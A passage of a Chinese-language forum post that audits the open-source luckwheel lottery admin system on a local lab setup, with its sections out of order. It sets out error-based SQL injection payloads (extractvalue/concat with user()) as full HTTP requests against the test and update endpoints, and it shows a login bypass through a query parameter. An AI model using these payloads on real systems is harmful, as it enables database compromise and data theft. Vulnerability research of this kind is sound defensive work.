
![](upload/attach/202207/809626_ZMRJZHDJEM43HP4.jpg)

修改完之后重启

![](upload/attach/202207/809626_QQVF95DRNC9MGMK.jpg)

可以看到加上单引号之后报错

![](upload/attach/202207/809626_ZK35NVG8Y5DE335.jpg)

构造参数，成功注入

```http
POST /luck/lup/update HTTP/1.1
Host: 192.168.2.147:7777
User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Mobile Safari/537.36 Edg/103.0.1264.44
X-Requested-With: XMLHttpRequest
Referer: http://192.168.2.147:7777/luck/luckmanager.html
Accept-Encoding: gzip, deflate
Content-type: application/json
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Length: 94
{"id":1,"exchange":1,
"pname":"1元",
"uid":"1' and extractvalue(1,concat(0x5c,user()))--'"}
```

## 6、SQL注入四处[假的SQL注入]

![](upload/attach/202207/809626_X7GUC9YRKSHWUUJ.jpg)

这里注入有一个前提，来看一代码，这里下面的`UPDATE`也是直接`+`号拼接了语句，但是上面有一个`if`判断，判断返回的`map`是不是空或者大小是不是0，那么Debug调一下会发现

![](upload/attach/202207/809626_7PKSNHTDVXBNS9T.jpg)

```mysql
select * from codepay_order where pay_id='1' and pay_tag>=0 and money>=200 and pay_tag <FLOOR(money/200) and up_time >='2019-1-15 0:0:0'
```

首先在`codepay_order`这个表中`pay_id`要等于1，并且`pay_tar`大于或者等于0，并且`money`需要大于或等于200，并且`floor()`计算出来的值需要小于`pay_tag`，那么这里看一下`floor()`的值是多少

![](upload/attach/202207/809626_HQWJWRTAY3HBCTQ.jpg)

这里的条件肯定就已经不成立了，因为这里的`pay_tag`是1，那么这里想让条件成立的话，就把数据库中的`pay_tag`改为0即可

![](upload/attach/202207/809626_FHUFH96GUYWFD4P.jpg)

![](upload/attach/202207/809626_W44PMW7NKHSD69F.jpg)

重新请求之后可以看到，已经走到了`update`的流程

```http
HTTP/1.1 500
Content-Type: application/json;charset=UTF-8
Date: Wed, 06 Jul 2022 10:20:36 GMT
Connection: close
Content-Length: 364
{"timestamp":"2022-07-06T10:20:36.094+0000","status":500,"error":"Internal Server Error","message":"StatementCallback; bad SQL grammar [update codepay_order set pay_tag=pay_tag+1 where pay_id='1' and pay_no='null']; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column 'pay_no' in 'where clause'","path":"/luck/wheel/test"}
```

从这里的报错可以看出来，好像没有这个字段，去数据库里面添加

![](upload/attach/202207/809626_NGA2T84JM8QQXBQ.jpg)

再次请求接口会返回TRUE

![](upload/attach/202207/809626_K5C47NTH6AFKDHP.jpg)

上述报错知道了SQL语句

```java
jdbcTemplate.update("update codepay_order set pay_tag=pay_tag+1 where pay_id='"+uid+"' and pay_no='"+pay_no+"'");
```

因为这里没办法返回具体的值，只会显示FALSE和TRUE

![](upload/attach/202207/809626_URB3X6V4FRE7YSA.jpg)

在终端的`print`可以看到，没有办法，所以这里盲注，白盒下其实可以改一下代码，输出一下SQL语句

![](upload/attach/202207/809626_3JEFBMT62SCZDW9.jpg)

加两行代码，然后重启，然后试了半天才发现，这里没办法到UPDATE那里

![](upload/attach/202207/809626_PDZ4TGHXY7XNHPM.jpg)

因为如果报错注入的话，上面的`jdbcTemplate.queryForList`就已经报错回显了，但是如果不报错的话，`payload`又没办法到`UPDATE`语句，所以这里：)

目录

- [前言](https://bbs.kanxue.com/#前言)

- [环境搭建](https://bbs.kanxue.com/#环境搭建)

- [1、导入数据库](https://bbs.kanxue.com/#1、导入数据库)

- [2、访问页面](https://bbs.kanxue.com/#2、访问页面)

- [3、解决参数错误的报错](https://bbs.kanxue.com/#3、解决参数错误的报错)

- [代码审计](https://bbs.kanxue.com/#代码审计)

- [1、SQL注入一处](https://bbs.kanxue.com/#1、sql注入一处)

- [2、SQL注入二处](https://bbs.kanxue.com/#2、sql注入二处)

- [3、后台存储XSS](https://bbs.kanxue.com/#3、后台存储xss)

- 4、FastJson 1.2.41 RCE

- FastJson 1.2.41

- [5、SQL注入三处](https://bbs.kanxue.com/#5、sql注入三处)

- [6、SQL注入四处[假的SQL注入]](https://bbs.kanxue.com/#6、sql注入四处[假的sql注入])

# 前言

比较简单的代码！

# 环境搭建

Github地址: [GitHub - s6056826/luckwheel: 国产开源幸运大转盘管理系统，积分，倍率，奖品兑换](https://bbs.kanxue.com/elink@fc5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6y4U0l9#2y4U0R3J5y4W2)9J5c8X3I4#2j5$3E0%4K9r3g2W2L8l9`.`.)

CSDN介绍地址: [开源大转盘抽奖源码，带后台管理，可管理奖品和奖品中奖概率，java语言实现*飞吧菜鸟了的博客-CSDN博客*转盘抽奖源码](https://bbs.kanxue.com/elink@712K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4x3$3x3o6f1$3z5o6t1$3j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3z5o6j5#2y4o6p5I4y4K6M7`.)

下载之后用Idea打开，首先导入数据库

![](https://bbs.kanxue.com/upload/attach/202207/809626_Z2GCV8YJ4Z373SP.jpg)

这个数据库里面只有表，不会自动创建库。所以需要手动创建一个数据库

![](https://bbs.kanxue.com/upload/attach/202207/809626_J6UJGVFSZ6GHFY9.jpg)

## 1、导入数据库

看一眼spring的配置库名叫`youyoudb`

![](https://bbs.kanxue.com/upload/attach/202207/809626_PJXR2CYUNXCMCRU.jpg)

创建跟这个一样的名称，然后导入表即可

![](https://bbs.kanxue.com/upload/attach/202207/809626_CRBBB9Q8DCKZZ2G.jpg)

> 这里的`codepay_order`是我自己创建的，后边会说到为什么

然后idea maven会自动添加下载依赖，等待全部下好之后，启动即可

![](https://bbs.kanxue.com/upload/attach/202207/809626_NCZQSRT7YQW27K9.jpg)

## 2、访问页面

直接访问会提示404

![](https://bbs.kanxue.com/upload/attach/202207/809626_HDFZKEX8TG4WSR5.jpg)

看一眼静态文件配置

![](https://bbs.kanxue.com/upload/attach/202207/809626_NPFF3TXP5K9F78E.jpg)

访问`index.html`和`luckmanager.html`也会提示404

![](https://bbs.kanxue.com/upload/attach/202207/809626_XQCAKZTWZTH6MKU.jpg)

看一眼spring配置

![](https://bbs.kanxue.com/upload/attach/202207/809626_5TPGRDG2P77FDWS.jpg)

注意这里的`server.servlet.context-path`

> `server.servlet.context-path`
>
> 1、`server.servlet.context-path`= # Context path of the application. 应用的上下文路径，也可以称为项目路径，是构成url地址的一部分。
>
> 2、`server.servlet.context-path`不配置时，默认为 `/` ，如：`localhost:8080/xxxxxx`
>
> 3、当`server.servlet.context-path`有配置时，比如 `/demo`，此时的访问方式为`localhost:8080/demo/xxxxxx`

所以在访问的时候需要加上`/luck`来访问

![](https://bbs.kanxue.com/upload/attach/202207/809626_3WG6HA78SK5FEJR.jpg)

## 3、解决参数错误的报错

然后就一直会提示参数错误，看一眼JS

![](https://bbs.kanxue.com/upload/attach/202207/809626_W7D454KDUE8U6K8.jpg)

| 行号 | 代码 |
| --- | --- |
| 1 | `var uid = getQueryString("pnum");` |
| 2 | `if(uid==""||uid==null||uid===undefined){` |
| 3 | `alert("非法参数错误，请重新打开页面!");` |
| 4 | `window.location.reload();` |
| 5 | `}` |

这里会判断`uid`的值，上面的变量可以看到`uid`来自另外一个函数，这里函数这个`pnum`是GET参数，跟过去看一眼

![](https://bbs.kanxue.com/upload/attach/202207/809626_SJ74PKHU4P9X3UC.jpg)

| 行号 | 代码 |
| --- | --- |
| 1 | `function getQueryString(name) {` |
| 2 | `var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");` |
| 3 | `var r = window.location.search.substr(1).match(reg);` |
| 4 | `if (r != null) return unescape(r[2]);` |
| 5 | `return null;` |
| 6 | `}` |

这里正则匹配我们不需要管，只需要返回值不等于`NULL`即可，所以我们直接在前端构造一个`pnum`参数试试

![](https://bbs.kanxue.com/upload/attach/202207/809626_MVE9TJRTNE4H3WK.jpg)

现在不报错了，这里为什么会不报错主要是因为在数据库中有`id`为1的用户，可以看一眼数据库

![image-20220714161738766](https://bbs.kanxue.com/upload/attach/202207/809626_NJCQPUQH57MY8EA.jpg)

这里的值是我自己加的，所以就不会报错了

> 这里已经任意用户登录了吧

然后在`common.js`中可以看到，其实之前可能有登录功能

![](https://bbs.kanxue.com/upload/attach/202207/809626_DN78WKWQFVMXEH5.jpg)

但是下载下来的源码并没有，开始以为是作者删了，我又去看了一遍commit，发现根本就没有上传登录的前端源码

![](https://bbs.kanxue.com/upload/attach/202207/809626_XS44V9CURNS8UAJ.jpg)

看一眼后台的样子

![](https://bbs.kanxue.com/upload/attach/202207/809626_NZDHFQPCPP2AM2W.jpg)

目前所有的搭建都已经完成了

# 代码审计

## 1、SQL注入一处

我这里是直接搜关键字找执行SQL语句的地方

![](https://bbs.kanxue.com/upload/attach/202207/809626_RDEJR3EPV9XTW5N.jpg)

![](https://bbs.kanxue.com/upload/attach/202207/809626_TFMR2P5D4G7AJXN.jpg)

一眼望去就可以看到SQL注入一个

> `test`接口，参数`uid`

![](https://bbs.kanxue.com/upload/attach/202207/809626_5VDX25Q64BD3PZ4.jpg)

直接构造参数去请求接口

![](https://bbs.kanxue.com/upload/attach/202207/809626_WWS8HWJUD2F6NH7.jpg)

这里直接查询会显示没有这个表，所以按照这里SQL语句的参数去构造表字段即可

![](https://bbs.kanxue.com/upload/attach/202207/809626_HCENCPWK348ZQ5N.jpg)

随后再请求接口

![](https://bbs.kanxue.com/upload/attach/202207/809626_PDGM4JSP2HVSMSH.jpg)

这里只会返回FALSE或者TURE

![](https://bbs.kanxue.com/upload/attach/202207/809626_DFDQCRZ8T3XDF94.jpg)

但是这里的是会回显报错的，所以构造报错语句的参数

```sql
select * from codepay_order where pay_id='1'' and pay_tag>=0 and money>=200 and pay_tag <FLOOR(money/200) and up_time >='2019-1-15 0:0:0'
```

看一下这里报错的语句，首先需要闭合前面的单引号，然后构造`and`后面跟报错的函数最后注释即可，`payload`如下

```http
GET /luck/wheel/test?uid=1'and+extractvalue(1,concat(0x5c,user()))--' HTTP/1.1
```

![](https://bbs.kanxue.com/upload/attach/202207/809626_5MBJDD2ZAMCWAZM.jpg)

返回了当前用户，这里注释后面需要加上单引号，因为如果不加上，后面那个单引号无法闭合，可以看下图
